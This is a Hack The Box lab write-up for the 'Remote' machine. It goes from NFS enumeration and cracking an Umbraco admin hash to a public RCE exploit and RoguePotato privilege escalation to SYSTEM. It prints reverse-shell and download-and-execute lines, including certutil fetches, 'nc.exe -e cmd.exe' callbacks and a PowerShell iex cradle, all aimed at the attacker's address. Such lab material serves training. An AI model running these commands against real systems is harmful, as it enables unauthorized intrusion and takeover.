# Remote [HTB]()
![remote-01]()

## Recon

Let's start enumerating the target with an `nmap` scan:

```bash
nmap -p- --min-rate 10000 remote.htb
```

After we get the ports we can query the service verisons with:

```bash
nmap -p 21,80,111,135,139,445,2049,5985,47001 -sCV remote.htb -oN nmap.result # I Left out some RPC related ports 
```

![nmap-res-02]()

We have the following:

+ A Microsoft FTPd server on port 21.
+ An HTTP server on port 80.
+ An rpcbind endpoint on port 111.
+ An rpc endpoint-mapper on port 135.
+ NetBIOS on port 139.
+ An SMB server on port 445.
+ A possible NFS share on port 2049.
+ Two HTTPAPI ports at 5985 & 47001.

Quite a large attack surface. It appears that the FTP server is allowing anonymous logins so let's start with that. Afterwards, we can take a look at the NFS share on port 2049, as the NFS protocol doenst have any authintication or authorization. Then we can take a look at the SMB and HTTP servers. 

## FTP Port 21

After connecting anonymously to the server I ran `ls` to list out the contents but it came out empty:

![ftp-empty-03]()

I then tried to download any possible file from the server using this one liner:

```bash
wget -m ftp://anonymous:anonymous@remote.htb
```

But this came out empty as well so i decided to move on to the NFS share. 

## NFS Port 2049 & 111.

If we list out the rpc info using `rpcinfo remote.htb`:

![rpcinfo-04]()

We can see that we have `nfs` listening on `0.0.0.0`, which means we have a network share out there. We can verify this with 

```bash
showmount -e remote.htb
``` 

![showmount-05]()

We have `/site_backups` publicly avialbale to anyone. We can mount this on our local machine with:

```bash
mkdir /mnt/remote.htb
mount -o rw,vers=2 remote.htb:/site_backups /mnt/remote.htb
```

If we `cd` into this directory and run `ls` we can the following:

![dir-tree-06]()

Looks like a backup directory tree of an IIS server. We also see the word `Umbraco` here as well. [Umbraco](https://en.wikipedia.org/wiki/Umbraco) is an open-source CMS platform built on Microsoft .NET framework and designed to work on IIS servers.  

I started by taking a look at `Web.Config`. On line 44 I found this line:

![ver-07]()

I searched online and found an [RCE exploit](https://github.com/Jonoans/Umbraco-RCE) for this version, but we need to be authinticated to pull it off. So i decided to keep looking around the filesystem. 

I started to dig into every file, but I was rather lost, so I to search online for information about juicy Umbraco files. And that's where I found [this post](https://our.umbraco.com/forum/core/general/47400-How-does-Umbraco-store-its-data#:~:text=The%20content%20data%20is%20stored,file%20at%20%2FApp_Data%2Fumbraco.) that mentioned a database at `App_Data/Umbraco.sdf`. So I decided to look for ways to open this file.

I tried to use online tool to convert it to `csv` as well as different forms of databases like `MySQL` and `MariaDB` but nothing worked. I also tried `christianhelle`'s [sqlcequery](https://github.com/christianhelle/sqlcequery) tool to pen sdf files but it didnt work either. 

So instead I ran `strings` on it to see what I can extract:

![strings-08]()

This looks important. I see two user accounts here, `admin` and `smith`, as well as two hashing algorithms, `SHA-1` and `HMAC-SHA256`. I decided to go for the admins password first. 

I cracked it with the following syntax:

```bash
hashcat -m 100 -a 0 "b8be16afba8c314ad33d812f22a04991b90e2aaa" rockyou.txt
```
![pass-09]

The admin's password is `baconandcheese`. Lets try to log in. 


## HTTP Port 80.

Let's figure out where we can log in to the CMS. At first I opend the site at `http://remote.htb` :

![site-10]()

Ok, not much here. Let's run a directory scan with:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://remote.htb/FUZZ -e .cgi,.js,.txt,.xml,.aspx
```

![install-11]()

This sounds interesting and it also gave us a redirect. Lets see where this leads:

![login-page-12]()

It redirected us to `http://remote.htb/umbraco/#/login`. At first I tried authinticating with `admin : `baconandcheese` but this failed. I tried different usernames until I found that `admin@htb.local` works:

![admin-13]()

This username is mentioned in the `Umbraco.sdf` file as well. 

## Initial-Access Exploit

After reveiwing the [source code](https://github.com/Jonoans/Umbraco-RCE/blob/master/exploit.py#L76) of the exploit for a bit, its seems ready to go. We just need to insatll the exploit with:

```bash
git clone https://github.com/Jonoans/Umbraco-RCE
cd Umbraco-RCE
pip install -r requirements.txt
chmod +x exploit.py
```

Then we can run the exploit with:

```bash
./exploit.py -u admin@htb.local -p baconandcheese -w http://remote.htb/ -i 10.10.14.39
```

Which gives us initial access to the target:

![shell-14]()

However this shell gave me a lot of issues, it was quite unstable. So I hosted `nc.exe` on my Kali machine via a python web server, and downloaded it to the target and connected back to my kali with:

```cmd
cd c:\\windows\temp
certutil -urlcache -f http://10.10.14.39/nc.exe nc.exe
.\nc.exe -e cmd.exe 10.10.14.39 443
```

![shell-15]()

## Privilege Escalation

After landing on the machine, I started hunting for quick wins. First, I looked at our user's privileges with:

```cmd
whoami /priv
```

![privs-16]()

Looks like we have the `Impersonate` privilege enbaled which means we can try to pull off a potato attack. However if we take a look at the target OS we will see it is running a 2019 Windows server:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

![os-17]()

So `JuicyPotato` wont work here. Instead we can use [RoguePotato](https://github.com/antonioCoco/RoguePotato). We can download a compiled version [here](https://github.com/k4sth4/Rogue-Potato/blob/main/RoguePotato.exe). 

Once the have Rogue-Potato on our Kali, we need to transfer it over to the target. Set up a python server:

```bash
python3 -m http.server 80
```

And download the both Rogue-Potao to the target with:

```cmd
certutil -urlcache -f http://10.10.14.39/RoguePotato.exe rp.exe
```

Now, we setup `socat` to run on port 135 on our Kali machine and redirect it back to remote on port 9999:

```bash
socat tcp-listen:135,reuseaddr,fork tcp:10.129.231.183:9999
```

Then I tried to connect on a shell using:

```cmd
.\rp.exe -r 10.10.14.39 -e "c:\\Windows\\Temp\nc.exe -e cmd.exe 10.10.14.39 9001" -l 9999
```

Rogue-Potato succesfully executed, but I didnt get a shell. So instead I decided to go for a different approach with nishang's [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script. Make sure to invoke the script at the end:

![invoke-17.5]()

I hosted this file with a python server, and started my listener with:

```bash
rlwrap nc -lnvp 9001
```

Then, I executed Rogue-Potato once again with:

```cmd
.\rp.exe -r 10.10.14.39 -e "powershell -c iex( iwr http://10.10.14.39/shell.ps1 -UseBasicParsing)" -l 9999
```

This gave me a shell as the SYSTEM:

![root-18]()

